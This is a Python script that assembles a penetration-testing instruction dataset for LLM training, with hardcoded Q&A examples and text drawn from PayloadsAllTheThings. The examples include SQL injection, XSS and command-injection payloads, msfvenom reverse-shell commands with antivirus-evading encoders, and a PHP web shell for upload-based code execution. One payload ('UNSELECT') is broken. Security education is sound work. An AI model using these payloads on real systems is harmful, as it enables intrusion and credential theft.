#!/usr/bin/env python3
"""
Comprehensive Pentesting Dataset Builder
Combines multiple sources for LLM training
"""

import json
import os
import logging
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from datetime import datetime

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

PAYLOADS_DIR = Path('/home/popic/PayloadsAllTheThings')
OUTPUT_DIR = Path('/home/popic/telegram-bot/dataset')

@dataclass
class TrainingExample:
    """Single training example for LLM"""
    instruction: str
    output: str
    input: str = ""
    category: str = "general"
    source: str = "PayloadsAllTheThings"
    difficulty: str = "intermediate"

@dataclass
class Dataset:
    examples: List[TrainingExample] = field(default_factory=list)
    
    def add(self, example: TrainingExample):
        self.examples.append(example)
    
    def save(self, path: Path, format: str = "jsonl"):
        path.parent.mkdir(parents=True, exist_ok=True)
        
        if format == "jsonl":
            with open(path, 'w') as f:
                for ex in self.examples:
                    f.write(json.dumps({
                        "instruction": ex.instruction,
                        "input": ex.input,
                        "output": ex.output,
                        "category": ex.category,
                        "source": ex.source,
                        "difficulty": ex.difficulty
                    }) + '\n')
        elif format == "json":
            with open(path, 'w') as f:
                json.dump([{
                    "instruction": ex.instruction,
                    "input": ex.input,
                    "output": ex.output,
                    "category": ex.category,
                    "source": ex.source,
                    "difficulty": ex.difficulty
                } for ex in self.examples], f, indent=2)
        
        logger.info(f"Saved {len(self.examples)} examples to {path}")

def extract_from_markdown(content: str, category: str) -> List[TrainingExample]:
    """Extract Q&A from markdown files"""
    examples = []
    
    lines = content.split('\n')
    current_section = ""
    current_content = []
    
    for line in lines:
        if line.startswith('#'):
            if current_content and len(' '.join(current_content)) > 100:
                ex = TrainingExample(
                    instruction=f"Explain {current_section} vulnerability and how to exploit it",
                    output=' '.join(current_content)[:1500],
                    category=category,
                    source="PayloadsAllTheThings"
                )
                examples.append(ex)
            current_section = line.lstrip('#').strip()
            current_content = []
        elif line.strip() and not line.startswith('```'):
            current_content.append(line.strip())
    
    return examples

def build_payloads_dataset() -> List[TrainingExample]:
    """Build dataset from PayloadsAllTheThings"""
    examples = []
    
    vuln_categories = [
        ('SQL Injection', 'injection'),
        ('XSS', 'injection'),
        ('Command Injection', 'injection'),
        ('Buffer Overflow', 'memory'),
        ('Server Side Request Forgery', 'request'),
        ('Insecure Deserialization', 'serialization'),
        ('Privilege Escalation', 'privesc'),
        ('Cross-Site Request Forgery', 'csrf'),
    ]
    
    for category, tag in vuln_categories:
        cat_dir = PAYLOADS_DIR / category
        if not cat_dir.exists():
            continue
            
        for md_file in cat_dir.glob('*.md'):
            try:
                content = md_file.read_text(encoding='utf-8', errors='ignore')
                if len(content) > 100:
                    examples.append(TrainingExample(
                        instruction=f"What is {category}? Explain the vulnerability.",
                        output=content[:1500],
                        category=tag,
                        source="PayloadsAllTheThings"
                    ))
            except:
                pass
    
    return examples

def build_fundamentals_dataset() -> List[TrainingExample]:
    """Core penetration testing fundamentals"""
    return [
        TrainingExample(
            instruction="What is SQL injection and how does it work?",
            output="""SQL injection is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not strongly typed.

Types:
1. In-band SQLi (classic) - most common
2. Blind SQLi - no visible output
3. Union-based SQLi - combines results

Example payloads:
- ' OR '1'='1 (authentication bypass)
- admin'-- (comment out rest of query)
- UNSELECT NULL,NULL,NULL-- (union-based)

Prevention:
- Use parameterized queries/prepared statements
- Input validation
- Least privilege database accounts""",
            category="injection",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="Explain buffer overflow exploitation",
            output="""Buffer overflow occurs when data written to a buffer exceeds its allocated size, corrupting adjacent memory.

Exploitation:
1. Identify vulnerable input
2. Send more data than buffer can hold
3. Overwrite return address with shellcode address
4. Use NOP sled to slide execution to shellcode

Key concepts:
- Stack-based vs heap-based overflows
- Saved return address overwrite
- SEH (Structured Exception Handler) overwrite
- DEP (Data Execution Prevention) bypass via ROP

Prevention:
- Safe string functions (strncpy, strncat)
- Stack canaries
- ASLR (Address Space Layout Randomization)""",
            category="memory",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="What is ROP (Return-Oriented Programming) chaining?",
            output="""ROP is an exploit technique that bypasses DEP by using code snippets already in memory.

How it works:
1. Find useful code gadgets in shared libraries
2. Each gadget performs operation then jumps to next
3. Chain them to build functionality without new code

Gadgets: small instruction sequences ending in ret, jmp, or call

Tools:
- ROPgadget
- ropper  
- mona.py (Immunity Debugger)

Why it works:
- DEP prevents executing new code on stack
- But legitimate code in memory is executable
- ROP chains existing snippets""",
            category="exploitation",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="How does privilege escalation work on Linux?",
            output="""Privilege escalation moves from low-privilege to root/admin.

Horizontal: Same level, different user
Vertical: Gaining higher privileges (user -> root)

Enumeration:
- uname -a (kernel version)
- cat /etc/passwd (users)
- sudo -l (sudo permissions)
- find / -perm -4000 2>/dev/null (SUID files)
- ls -la /var/backups (sensitive files)

Kernel exploits:
1. Identify: uname -a, searchsploit
2. Find matching exploit
3. Compile and run

Other methods:
- SUID exploit
- sudo misconfiguration
- writable /etc/passwd
- cron jobs
- NFS no_root_squash""",
            category="privesc",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="Explain XSS (Cross-Site Scripting) types",
            output="""XSS injects malicious scripts into trusted websites.

Types:
1. Reflected XSS - in URL parameters, immediate
2. Stored XSS - saved on server, persistent
3. DOM-based XSS - client-side manipulation

Example payloads:
- <script>alert(1)</script>
- <img src=x onerror=alert(1)>
- <svg onload=alert(1)>
- <body onload=alert(1)>

Impact:
- Session cookie theft
- Keylogging
- Defacement
- Phishing

Prevention:
- Output encoding
- Content Security Policy (CSP)
- HTTPOnly cookies
- Input validation""",
            category="injection",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="What is command injection and how to prevent it?",
            output="""Command injection executes OS commands on server through vulnerable input.

Example payloads:
- ; ls -la
- | whoami
- `id`
- $(whoami)
- && cat /etc/passwd

Discovery:
- Test with time delays: sleep 5
- Output differences: whoami vs $(whoami)

Prevention:
- Input validation (allowlist)
- Avoid system()/exec() calls
- Use language APIs, not shell
- Escape user input if shell necessary""",
            category="injection",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="Explain network enumeration with Nmap",
            output="""Nmap is the industry-standard network scanning tool.

Basic scans:
- nmap <target> (default)
- nmap -sV <target> (version detection)
- nmap -sC <target> (default scripts)
- nmap -p- <target> (all ports)

Scan types:
- -sT: TCP connect (full handshake)
- -sS: SYN stealth (half handshake)
- -sU: UDP scan
- -sN: Null scan
- -sX: Xmas scan

OS detection: -O
Service versions: -sV
Aggressive: -A
Timing: -T4 (fast)

Output formats:
- -oA: all formats
- -oG: grepable""",
            category="enumeration",
            source="security-fundamentals"
        ),
        TrainingExample(
            instruction="How to use Metasploit/m sfvenom for payload generation",
            output="""msfvenom generates payloads for various platforms.

Windows:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

Linux:
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

PHP:
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

Python:
msfvenom -p python/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.py

Encoders (evade AV):
- x86/shikata_ga_nai
- x86/nonalpha
- x86/call4_dword_xor

Format options: exe, elf, raw, python, java, dll""",
            category="tools",
            source="security-fundamentals"
        ),
    ]

def build_automated_tools_dataset() -> List[TrainingExample]:
    """Automated pentesting tools knowledge"""
    return [
        TrainingExample(
            instruction="Compare automated pentesting tools: ZAP vs Burp Suite vs Invicti",
            output="""ZAP (OWASP Zed Attack Proxy):
- Free, open-source
- Good for developers, CI/CD via CLI
- Requires manual configuration
- No business logic testing

Burp Suite:
- Industry standard for manual testing
- Powerful proxy, repeater, intruder
- Extensive plugin ecosystem
- Requires expertise

Invicti (Netsparker):
- Proof-based scanning
- Enterprise compliance reporting
- Automatic exploit validation
- Per-seat pricing""",
            category="tools",
            source="automated-pentesting"
        ),
        TrainingExample(
            instruction="What are the best automated pentesting tools for enterprises?",
            output="""Top enterprise tools (2026):

1. Escape - API business logic, GraphQL
2. Pentera - Internal network, AD
3. Invicti - Web apps, compliance
4. XBOW - AI red team simulation
5. Hadrian - Event-driven

Open-source alternatives:
- ZAP - Free DAST
- Metasploit - Exploitation
- Nmap - Reconnaissance

Selection criteria:
- Business logic detection
- False positive rate
- API protocol support
- CI/CD integration""",
            category="tools",
            source="automated-pentesting"
        ),
    ]

def build_quiz_dataset() -> List[TrainingExample]:
    """Interactive quiz questions"""
    return [
        TrainingExample(
            instruction="Q: What technique bypasses DEP by using code already in memory?",
            output="ROP (Return-Oriented Programming) Chaining",
            category="quiz",
            source="interactive-learning"
        ),
        TrainingExample(
            instruction="Q: Which SQL injection payload bypasses authentication?",
            output="' OR '1'='1",
            category="quiz",
            source="interactive-learning"
        ),
        TrainingExample(
            instruction="Q: What prevents executing code on the stack?",
            output="DEP (Data Execution Prevention)",
            category="quiz",
            source="interactive-learning"
        ),
        TrainingExample(
            instruction="Q: Nmap flag for version detection?",
            output="-sV",
            category="quiz",
            source="interactive-learning"
        ),
        TrainingExample(
            instruction="Q: Type of XSS stored in database?",
            output="Stored XSS",
            category="quiz",
            source="interactive-learning"
        ),
    ]

def build_scenario_dataset() -> List[TrainingExample]:
    """Real-world pentesting scenarios"""
    return [
        TrainingExample(
            instruction="You find a login form. How do you test for SQL injection?",
            output="""SQL injection testing on login forms:

1. Basic payloads:
   - admin'--
   - admin'#
   - ' OR '1'='1

2. Error-based:
   - ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--

3. Boolean-based:
   - ' AND 1=1--
   - ' AND 1=2--

4. UNION-based:
   - ' UNION SELECT NULL--
   - ' UNION SELECT username,password FROM users--

Note: Check for SQL errors, different responses, time delays.""",
            category="practical",
            source="scenarios"
        ),
        TrainingExample(
            instruction="You have low-privilege shell on Linux. How do you escalate?",
            output="""Linux privilege escalation checklist:

1. Enumeration:
   - uname -a
   - sudo -l
   - find / -perm -4000 2>/dev/null

2. Useful files:
   - /etc/passwd (readable)
   - /var/log/* 
   - ~/.bash_history

3. SUID exploits:
   - Find kernel version
   - Searchsploit
   - Compile exploit

4. sudo misconfigs:
   - sudo -l
   - GTFOBins lookup

5. Cron jobs:
   - crontab -l
   - /etc/cron.d/*""",
            category="practical",
            source="scenarios"
        ),
        TrainingExample(
            instruction="Web app accepts file upload. How do you test for RCE?",
            output="""File upload RCE testing:

1. Extension bypass:
   - .php, .php5, .phtml
   - .asp, .aspx
   - .jsp, .jspx

2. MIME type:
   - image/jpeg
   - application/octet-stream

3. Double extensions:
   - shell.jpg.php

4. Null byte:
   - shell.php%00.jpg

5. Content:
   - <?php system($_GET['cmd']);?>
   - <%system($_GET['c']);%>

6. Uploaded location:
   - Check for direct access
   - Use path traversal""",
            category="practical",
            source="scenarios"
        ),
    ]

def create_full_dataset() -> Dataset:
    """Create complete training dataset"""
    dataset = Dataset()
    
    logger.info("Building payloads dataset...")
    for ex in build_payloads_dataset():
        dataset.add(ex)
    
    logger.info("Building fundamentals dataset...")
    for ex in build_fundamentals_dataset():
        dataset.add(ex)
    
    logger.info("Building automated tools dataset...")
    for ex in build_automated_tools_dataset():
        dataset.add(ex)
    
    logger.info("Building quiz dataset...")
    for ex in build_quiz_dataset():
        dataset.add(ex)
    
    logger.info("Building scenarios dataset...")
    for ex in build_scenario_dataset():
        dataset.add(ex)
    
    logger.info(f"Total examples: {len(dataset.examples)}")
    return dataset

def main():
    logger.info("Creating pentesting training dataset...")
    
    dataset = create_full_dataset()
    
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    
    dataset.save(OUTPUT_DIR / "pentesting_train.jsonl", "jsonl")
    dataset.save(OUTPUT_DIR / "pentesting_train.json", "json")
    
    categories = {}
    for ex in dataset.examples:
        if ex.category not in categories:
            categories[ex.category] = 0
        categories[ex.category] += 1
    
    logger.info(f"Categories: {categories}")
    logger.info(f"Saved to {OUTPUT_DIR}")

if __name__ == '__main__':
    main()